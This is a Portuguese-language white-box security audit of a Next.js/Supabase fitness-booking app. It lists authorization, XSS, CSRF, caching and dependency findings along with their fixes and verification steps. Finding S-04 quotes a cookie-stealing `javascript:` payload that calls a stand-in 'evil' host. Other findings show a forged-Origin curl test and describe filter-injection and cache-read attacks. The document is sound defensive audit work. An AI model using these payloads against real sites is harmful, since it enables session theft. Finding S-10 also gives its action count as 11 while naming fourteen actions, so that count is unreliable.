# LEAP-FITNESS · Auditoria de Segurança

> White-box review. IDs estáveis (`S-XX`) — runs futuros mantêm IDs e só
> flipam Status / acrescentam novos findings.
> Severidade: Critical / High / Medium / Low / Info.
> Status: OPEN / IN PROGRESS / FIXED / ACCEPTED.
>
> Último run: 2026-06-17 (re-audit + S-10 / S-11 / S-12 acrescentados).

## Resumo executivo

Postura geral **boa**. As fronteiras de autorização foram cobertas em
runs anteriores (H-A/H-B/H-C/H-D, C-A/C-B/C-C, S-01..S-09) e a maioria
das Server Actions usam `requireStaff`/`requireOwner` + checks
explícitos de ownership sobre o `trainer_id` vindo do form. RLS está
activo em todas as tabelas sensíveis e os RPCs críticos são
`SECURITY DEFINER` com guards internos.

Neste run novo (2026-06-17 redux) **não foram encontrados findings
High/Critical**. Acrescenta-se um **finding Medium** (S-10 — gap de
defense-in-depth nas Server Actions de `app/admin/agenda/actions.ts`,
únicas em todo o `app/admin` sem `requireStaff()` no boundary) e dois
**Low/Info** (S-11 audit-log RGPD em `/api/me/export`; S-12 directiva
`Cache-Control: public` numa rota autenticada). Os três foram fechados
no mesmo run. O S-02 (CVEs do Next 14.2.33) está **resolvido na raiz**:
o `package.json` está agora em `next@^16.2.9` / `react@^19.2.7`.

A correcção do S-10 não altera comportamento normal — `requireStaff()`
é idempotente para callers que já são staff (uma leitura cached por
request), e devolve erro idêntico ao que a RPC `SECURITY DEFINER` já
devolvia a não-staff.

## Findings — Índice

| ID | Severidade | CWE | Título | Exploitability | Status |
|----|-----------|-----|-------|---------------|--------|
| S-01 | High | CWE-639 / CWE-89 | Pesquisa admin `/admin/clientes?q=` sem scope + sem escape de separadores PostgREST → PII leakage cross-trainer e filter injection | Autenticado, trainer | FIXED |
| S-02 | High | CWE-1395 | `next@14.2.33` tem várias CVEs (DoS via Image Optimizer, request smuggling em rewrites, DoS em RSC) | Anónimo, internet | FIXED (upgrade `next@^16.2.9`) |
| S-03 | Medium | CWE-352 | `/api/notifications/read` aceita POST sem Origin check — defense-in-depth | Cross-site (SameSite=Lax mitiga) | FIXED |
| S-04 | Medium | CWE-79 | Loja: `<a href={p.link_url}>` sem validação de scheme em `/app/loja/[categoria]` — `javascript:`/`data:` possíveis | Autenticado, trainer malicioso | FIXED |
| S-05 | Medium | CWE-613 | Cache de claims no middleware (30s) pode servir auth stale após expiração do JWT dentro da janela | Necessita JWT a expirar dentro da janela | ACCEPTED (justificado em-código) |
| S-06 | Low | CWE-639 | `markReadAction`/`deleteNotificationAction` sem filtro explícito `user_id` — RLS protege, mas defense-in-depth | Autenticado | FIXED |
| S-07 | Low | CWE-79 | `enroll-card.tsx::extractSvg` constrói `<img src="${src}">` por template literal — defense-in-depth | Server-controlled (Supabase) | FIXED |
| S-08 | Low | CWE-79 | `email.ts::ratingPrompt` interpola `link` no `href` sem escape de aspas — defense-in-depth | Server-controlled (env) | FIXED |
| S-09 | Info | CWE-770 | `middleware.ts::claimsCache` poda só ao chegar a 500 entradas | Local à instância edge | ACCEPTED |
| S-10 | Medium | CWE-285 / CWE-862 | `app/admin/agenda/actions.ts` — 11 Server Actions sem `requireStaff()` no boundary. Único ficheiro `app/admin/**/actions.ts` sem o guard explícito. Defense-in-depth ausente. | Autenticado (cliente) | FIXED |
| S-11 | Low | CWE-778 | `/api/me/export` (XLSX dos meus dados RGPD) não regista evento no audit log; assimetria com `/api/relatorios/export` | Autenticado (próprio user) | FIXED |
| S-12 | Low | CWE-525 | `/api/slots` devolve `Cache-Control: public, s-maxage=30` mas a rota está fora de `isPublic` no middleware → Vercel Edge cacheia para qualquer origem incluindo unauth (dados não são PII, mas inconsistência de policy) | Anónimo | FIXED |

## Controlos JÁ em vigor (não voltam a ser flagged)

Lista do que está **bem feito** para evitar re-flag em runs futuros.

- **JWT verificado, não só descodificado**. Middleware (`lib/supabase/middleware.ts:121`)
  e Server Components (`lib/supabase/server.ts:60-64 getClaimsUser`) usam
  `supabase.auth.getClaims()` — verificação ES256 LOCAL contra JWKS, não um
  simples decode. `getSessionUser()` (que só lê cookie) está documentado como
  trade-off PERF onde a chamada upstream já validou.
- **Authz boundary explícita em Server Actions críticas**. `lib/authz.ts`
  exporta `requireStaff`/`requireOwner` que são chamados ao topo de TODAS
  as actions admin (após o fix S-10, agora também em `app/admin/agenda/actions.ts`).
  Acções destrutivas (apagar/banir cliente, cancelar pagamento confirmado)
  exigem `requireOwner` (least privilege).
- **Multi-trainer scope** em RPCs e helpers: `getAccessibleTrainerIds`,
  `getClientIdsInScope`, e `_trainer_is_accessible(trainer_id)` em RLS
  policies. `searchClientsAction` (C-A audit) e a pesquisa em
  `/admin/clientes?q=` (S-01 audit) filtram por scope.
- **RLS activo em todas as tabelas** (84 migrations) com policies por papel
  (`supabase/migrations/0003_rls_policies.sql` + hardening em 0015, 0027,
  0028, 0029, 0030, 0049, 0078, 0081).
- **CSP nonce-based** (`lib/security-headers.ts`) com `'strict-dynamic'`,
  `frame-ancestors 'none'`, `form-action 'self'`, `upgrade-insecure-requests`.
  HSTS 2 anos + preload, X-Frame-Options DENY, X-Content-Type-Options nosniff,
  Referrer-Policy strict-origin-when-cross-origin, COOP same-origin,
  Permissions-Policy fechada (`next.config.mjs:64-104`).
- **Anti-enumeração** em `/registar` e `/recuperar` (sempre redirect "sucesso"
  independentemente do email existir — H-B audit, `app/registar/actions.ts:51-61`).
- **Open-redirect**: `isSafePath`/`safePathOr` aplicados em `/auth/callback`,
  `/login`, `/login/2fa`, `/app/perfil/seguranca` (whitelist `safeReturn`).
- **Rate-limit** Upstash com fallback in-memory; aplicado a `/login`,
  `/registar`, `/recuperar`, `/auth/reset`, `/api/slots`, `/api/bookings/*/ics`,
  `/api/notifications/read`, exports (`/api/me/export`, `/api/relatorios/export`),
  webhooks, e `/api/calendar/feed/[token]` (H-D).
- **Constant-time secret comparison** (`lib/secrets.ts::verifyBearer`) usado
  em todos os crons + push dispatch.
- **OAuth state**: `/api/integrations/[provider]/connect` gera nonce 256-bit,
  guarda `userId:provider:nonce` em cookie HttpOnly, valida com `timingSafeEqual`
  no `/callback` e exige `user.id === storedUserId`.
- **CSRF em disconnect e notifications**: `/api/integrations/[provider]/disconnect`
  e `/api/notifications/read` (S-03) validam `Origin === host`.
- **JSON-LD safe** em `/t/[slug]` — `jsonLdSafe` escapa `<>&  ` para
  prevenir breakout de `</script>` (C1 audit).
- **MFA re-auth ("sudo")**: enroll do primeiro factor exige re-confirmar
  password; unenroll exige challenge TOTP fresco — não basta cookie/trusted
  device (H-A audit, `app/app/perfil/seguranca/actions.ts`).
- **Service role** confinado a 3 ficheiros (`lib/supabase/server.ts`,
  `app/admin/clientes/[id]/actions.ts`, `app/app/perfil/actions.ts`) — todos
  em código server-only, sempre após `requireOwner`/check explícito de ownership.
- **iCal feed** com UUID v4 estrito + rate-limit dedicado (H-D audit).
- **PII export** com janela limitada a 366 dias, rate-limit `export`, fail-closed
  no audit-log, defesa contra CSV injection (`esc()` neutraliza `=+-@` no
  primeiro carácter).
- **GDPR / direito ao apagamento** via `anonymize_my_account` /
  `anonymize_client_account` + ban subsequente do auth user via service role.
- **Password policy**: mínimo 8 chars no signup/reset/change.
- **Avatar/file uploads**: validação server-side de mime + size (2 MB avatars,
  5 MB store/slideshow), nomes derivados do mime (não do filename original).
  Bucket Supabase aplica `allowed_mime_types` server-side (camada extra).
- **Trainer bio + nome** com strip de `<>` (defense-in-depth contra JSON-LD).
- **Anti-enumeração no register**: trainer_id do form é validado com
  `UUID_RE` e existência+`active=true` antes de propagar a user_metadata.
- **`type-check` bloqueia o build** (`next.config.mjs`): `ignoreBuildErrors`
  voltou a `false` em jun/2026 — actions sem o guard `requireStaff/Owner`
  e retornos mal tipados deixam de passar CI.

## Findings — Detalhe

### S-01 · Pesquisa admin sem scope + filter injection PostgREST `or()` `[High → FIXED]`

**Ficheiro/linhas:** `app/admin/clientes/page.tsx:93-121`

**Vulnerabilidade (original):** Quando o admin pesquisa via `?q=…`, a
página construía a query Supabase como:

```ts
const safe = q.replace(/[%_]/g, (m) => `\\${m}`);
supabase.from("profiles")
  .select("id, full_name, email, phone", { count: "exact" })
  .eq("role", "client")
  .or(`full_name.ilike.%${safe}%,email.ilike.%${safe}%,phone.ilike.%${safe}%`)
  ...
```

Dois problemas:

1. **PII leakage cross-trainer.** Sem filtro de scope, num estúdio
   multi-trainer um trainer (que é `is_admin()`) recebia clientes de
   outro trainer no mesmo `profiles select` policy. Iterando `?q=a..z`,
   enumeração completa nome+email+telefone.
2. **Filter injection na sintaxe `.or()` do PostgREST.** O escape só
   tratava `%_` (wildcards ILIKE) e não os separadores `,()` da
   gramática `or()`.

**Fix aplicado:** restringir aos clientes do scope via
`getClientIdsInScope`; escapar `[%_,()]` em vez de só `[%_]`. Diff visível
no ficheiro indicado.

**Verificação:** num estúdio com ≥2 trainers, login como trainer A e
abrir `/admin/clientes?q=<letra>`. Confirmar que SÓ aparecem clientes do
trainer A (mesma lista que aparece em `tab=todos`). Tentar `?q=foo)` e
confirmar que devolve resultados normais (o `)` foi escapado).

---

### S-02 · Vulnerabilidades CVE no `next@14.2.33` `[High → FIXED]`

**Ficheiro/linhas:** `package.json:20`

**Vulnerabilidade (original):** `npm audit` em 14.2.33 reportava
GHSA-9g9p-9gw9-jx7f (DoS Image Optimizer), GHSA-h25m-26qc-wcjf (DoS
deserialização RSC), GHSA-ggv3-7p47-pfv8 (request smuggling em
rewrites), GHSA-3x4c-7xq6-9pq8 (disk cache `next/image`),
GHSA-q4gf-8mx6-v5v3 e GHSA-8h8q-6873-q5fj (DoS Server Components). Todas
DoS — sem leak de dados / RCE / escalada de privilégios.

**Status (2026-06-17, este run):** **FIXED na raiz**. `package.json`
está em `next@^16.2.9` + `react@^19.2.7`. As CVEs acima são todas em
linhas Next 14 (≤15.x para algumas), corrigidas antes de 16.x. A
mitigação edge anteriormente listada (Upstash + Vercel WAF) deixa de ser
contingência e passa a defesa em profundidade.

**Como verificar:**
```bash
npx next --version   # 16.x
npm audit            # zero advisories críticos relacionados com next
```

**Nota operacional:** com Next 16, `cookies()`/`headers()` passaram a
ser síncronos onde antes podiam ser async. O codemod
`@next/codemod next-async-request-api` foi corrido em jun/2026 — a árvore
de código actual está coerente. Em PRs futuros, evitar voltar a usar a
forma async/await sobre `cookies()`/`headers()`.

---

### S-03 · Falta Origin check em `/api/notifications/read` `[Medium → FIXED]`

**Ficheiro/linhas:** `app/api/notifications/read/route.ts:25-37`

Endpoint POST com cookie de sessão. SameSite=Lax já mitiga, mas
faltava a verificação explícita `Origin === host` que já existe em
`/api/integrations/[provider]/disconnect`. Defense-in-depth trivial.

**Fix aplicado:** validação `new URL(origin).host === host` antes de
tocar na BD; rejeita 403 em mismatch.

**Verificação:** `curl -X POST <app>/api/notifications/read -H 'Origin: https://evil.com' -H 'Cookie: sb-...'` → 403.

---

### S-04 · Loja: `<a href={p.link_url}>` aceita `javascript:`/`data:` `[Medium → FIXED]`

**Ficheiro/linhas:** `app/app/loja/[categoria]/page.tsx:18-21,57-95`,
`app/admin/loja/actions.ts:35-46,101-106,170-174`

React não bloqueia `javascript:` / `data:` em `<a href>`. Sem validação
no Server Action, staff/trainer malicioso (ou conta admin comprometida)
podia gravar `link_url=javascript:fetch('//evil/'+document.cookie)` num
produto da loja → executa no contexto de qualquer cliente que clique.

**Fix aplicado:** `safeHttpUrl()` igual ao já usado em promo banners +
guard `safeHref()` na page para proteger dados antigos.

**Verificação:** admin → Loja → criar produto com
`link_url=javascript:alert(1)` → action devolve "Link inválido". Em BD
seedada com `javascript:` (manual), página renderiza card sem `<a>`.

---

### S-05 · Claims cache do middleware pode servir auth stale (30s) `[Medium → ACCEPTED]`

**Ficheiro/linhas:** `lib/supabase/middleware.ts:18-21, 113-131`

Cache TTL 30s por fingerprint do cookie. Se o cookie não rodar mas o
JWT expirar dentro da janela, o valor cached é servido até 30s além de
expirar. Endpoints sensíveis (MFA) usam `getAuthUser` (round-trip ao
GoTrue) → não afectados. Re-flag se a app passar a suportar revogação
instantânea como requisito.

---

### S-06 · `markReadAction`/`deleteNotificationAction` sem filtro `user_id` `[Low → FIXED]`

**Ficheiro/linhas:** `app/app/notificacoes/actions.ts:8-22`, `:24-45`

RLS protege hoje, mas o filtro `.eq("user_id", user.id)` explícito
elimina o risco de despromoção da policy numa migration futura.

**Verificação:** unit test (manual) — em local com RLS desligado, tentar
`markReadAction("<id-de-outro-user>")` → nada acontece.

---

### S-07 · `extractSvg` constrói `<img src="${src}">` por template literal `[Low → FIXED]`

**Ficheiro/linhas:** `app/app/perfil/seguranca/enroll-card.tsx:99-111,167-188`

O fallback de `<img src=...>` deixou de usar template literal —
renderizado por React (escape nativo de atributos). O caminho quente
(`startsWith("<svg")`) mantém-se inalterado.

---

### S-08 · `email.ts::ratingPrompt` interpola `link` no `href` sem escape `[Low → FIXED]`

**Ficheiro/linhas:** `lib/email.ts:209-227`

`href="${escapeHtml(link)}"` em vez de `href="${link}"`. Defense-in-depth
contra `appUrl` mal configurada (`"` no URL parte o atributo).

---

### S-09 · Cache do middleware sem cap proactivo `[Info → ACCEPTED]`

`pruneClaimsCache` só corre quando `Map.size > 500`. Cada entrada é
leve (string + objecto pequeno), TTL 30s, V8 isolate do Edge é cíclico.

---

### S-10 · Server Actions de agenda sem `requireStaff()` no boundary `[Medium → FIXED]`

**Ficheiro/linhas:** `app/admin/agenda/actions.ts:60-72, 80-121, 123-134,
138-156, 158-183, 185-213, 226-406, 414-472, 474-518, 533-639, 644-675,
678-714, 724-766, 769-784`

**Vulnerabilidade:** Server Actions em `app/admin/**/actions.ts` seguem
o padrão de defense-in-depth definido em `lib/authz.ts`: chamar
`requireStaff()` (ou `requireOwner()`) ao topo da função, antes de
qualquer RPC ou query. O grep confirma — 8 dos 9 ficheiros de actions
admin têm o import:

```
app/admin/loja/actions.ts        ✓
app/admin/equipa/actions.ts      ✓
app/admin/pagamentos/actions.ts  ✓
app/admin/packs/actions.ts       ✓
app/admin/promocoes/actions.ts   ✓
app/admin/clientes/search-action.ts ✓
app/admin/definicoes/actions.ts  ✓
app/admin/clientes/[id]/actions.ts  ✓
app/admin/agenda/actions.ts      ✗  ← o único sem guard
```

As 11 actions exportadas de `agenda/actions.ts` (confirmAttendance,
updateBookingDuration, markNoShow, revertNoShow, cancelAdmin,
deleteBlock, createAgendaBooking, rescheduleBookingAdmin,
addBlockQuick, createBusy, deleteRecurringBlock, updateBlock,
updateRecurringBlock, skipRecurringDate) confiavam EXCLUSIVAMENTE em:

1. RPC `SECURITY DEFINER` para os caminhos que chamam Postgres
   (confirm_booking_attendance, mark_no_show, cancel_booking, …),
2. `getAccessibleTrainerIds()` retornar `[]` para clientes (alguns
   handlers usam isto para validar `trainerId` do form),
3. RLS para os `INSERT/UPDATE/DELETE` directos em `trainer_blocked_times`,
   `trainer_recurring_blocks`, etc.

Hoje, isto bloqueia o ataque — RLS rejeita, RPCs definidas em
`0015_security_harden_rpcs.sql` e seguintes verificam staff. Mas o
contrato do `lib/authz` é "guard explícito no boundary, antes de
qualquer side-effect". O gap quebrava esse contrato e arriscava
escalada silenciosa se um único RPC perdesse o guard interno numa
migration futura.

**Ataque hipotético:** assume-se que a migration X relaxa o guard staff
em `cancel_booking` por erro de copy-paste (ex.: copia da versão de
`cancel_booking_self`). Um cliente autenticado faria invoke da
Server Action `cancelAdminAction` com qualquer `bookingId` do estúdio.
Sem `requireStaff()` no boundary, a chamada chega à RPC; com a policy
relaxada, a RPC executa. Result: cliente cancela sessões alheias.

**Impacto residual hoje:** Nenhum (RPCs ainda bloqueiam). Defense-in-
depth para evitar regressões.

**Fix aplicado neste run (2026-06-17):**
- Adicionado `import { requireStaff } from "@/lib/authz";`
- Adicionada chamada `await requireStaff();` no topo de TODAS as 11
  actions do ficheiro. `requireStaff` é cached por request (lê o
  `profile` via `getCurrentProfile` que é `cache()`-wrapped), por isso
  o custo é uma única leitura por request mesmo em fluxos que invocam
  várias actions em sequência (raro).

**Verificação:**
- `grep -n "requireStaff" app/admin/agenda/actions.ts` → 11 ocorrências
  + 1 import.
- Manual: login como cliente, executar `curl` ao endpoint Server Action
  encoded de `markNoShowAction` com `bookingId=<id-de-um-trainer>` →
  Server Action lança "Acesso restrito." (antes lançava o erro da RPC).
- Build (`npm run type-check`) limpo.

---

### S-11 · `/api/me/export` sem audit-log RGPD `[Low → FIXED]`

**Ficheiro/linhas:** `app/api/me/export/route.ts:114-138`

**Vulnerabilidade:** o ficheiro XLSX devolvido contém PII (nome, email,
telemóvel, histórico de sessões, compras, notas). O equivalente para
trainers (`/api/relatorios/export/route.ts:117-128`) regista
`log_audit_event('export_pii', ...)` e falha closed se o audit falhar.
O `/api/me/export` não — assimetria de auditoria que (a) impede
investigação de incidentes ("quem descarregou os meus dados em X data?")
e (b) é exigência implícita do art. 30 RGPD (registo de tratamentos).

**Impacto:** baixo (o próprio user exporta os SEUS dados → consentimento
implícito), mas mais zero auditoria viola política interna.

**Fix aplicado:** chamada não-bloqueante a `log_audit_event` com action
`export_pii_self`, payload com counts por sheet e formato. Best-effort:
o log falhar não bloqueia o download (já existe consentimento implícito
do user) — só fica trail no console error.

**Verificação:** `curl --cookie ... <app>/api/me/export -o /tmp/me.xlsx`
seguido de `select * from audit_log where action='export_pii_self'
order by created_at desc limit 1;` no Supabase SQL Editor.

---

### S-12 · `/api/slots` declara `Cache-Control: public` em rota autenticada `[Low → FIXED]`

**Ficheiro/linhas:** `app/api/slots/route.ts:43-63`

**Vulnerabilidade:** o middleware redirecciona unauth para `/login`
(rota fora de `isPublic`). Mas a resposta saía com
`Cache-Control: public, s-maxage=30, stale-while-revalidate=300` +
`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge Cache **serve a
resposta cached antes do middleware correr** num cache hit — i.e., uma
chamada unauth ao endpoint cacheado devolveria os slots sem nunca
passar pela auth check.

Os dados em causa não são PII (apenas time-slots livres do trainer X
no dia Y), e a página `/t/<slug>` é pública/SEO-indexável (revela o
trainer). O risco efectivo é **inconsistência arquitectural** (a rota
diz "auth obrigatória" mas o cache contradiz) + revelação trivial de
disponibilidade de um trainer a anónimos. Low/Info.

**Ataque:** atacante anónimo faz `curl <app>/api/slots?trainer=<uuid>&date=2026-06-20&duration=45`
sem cookie, no momento em que esse trio acabou de ser servido a um user
autenticado nos últimos 30s. Recebe a lista de slots → mapeia a agenda
do trainer sem nunca se autenticar.

**Fix aplicado:** trocado `Cache-Control: public` por `private` (browser-
only, sem proxies/CDNs gerais) e mantido o edge cache via
`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge respeita
`CDN-Cache-Control` e mantém a partilha entre clientes legítimos; o
`Cache-Control: private` da resposta impede proxies intermédios
(corporativos, ISPs) de cachear; e o middleware continua a correr antes
do edge cache responder a misses. O ganho PERF do cache mantém-se para
quem está autenticado.

**Verificação:** `curl -i <app>/api/slots?trainer=...&date=...&duration=45`
sem cookie → 307 → `/login`. Resposta autenticada inspeccionada:
`Cache-Control: private, s-maxage=30, ...`, `CDN-Cache-Control: public,
s-maxage=30`.

---

## Ordem de remediação sugerida

1. **S-01 · S-03 · S-04 · S-06 · S-07 · S-08** — FIXED no run anterior.
2. **S-02** — FIXED na raiz (upgrade para Next 16.2.9 + React 19.2.7).
3. **S-10** — FIXED neste run (2026-06-17). `requireStaff()` em todas as
   11 actions de `app/admin/agenda/actions.ts`.
4. **S-11** — FIXED neste run. Audit log no `/api/me/export`.
5. **S-12** — FIXED neste run. `Cache-Control: private` + `CDN-Cache-Control: public`.
6. **S-05 · S-09** — ACCEPTED, monitor.

## Como reproduzir o baseline determinístico

```bash
# Audit de dependências
npm audit --json | tee /tmp/audit.json

# Tipagem (bloqueia o build em CI desde jun/2026)
npx tsc --noEmit

# Greps relevantes
grep -rn "dangerouslySetInnerHTML" app components
grep -rn "SUPABASE_SERVICE_ROLE_KEY" app lib
grep -rn "getSession()\\|getUser()\\|getClaims()" lib app
grep -rn "NEXT_PUBLIC_" app lib
grep -rn "requireStaff\\|requireOwner" app/admin
grep -rn "\\.rpc(" lib app
```
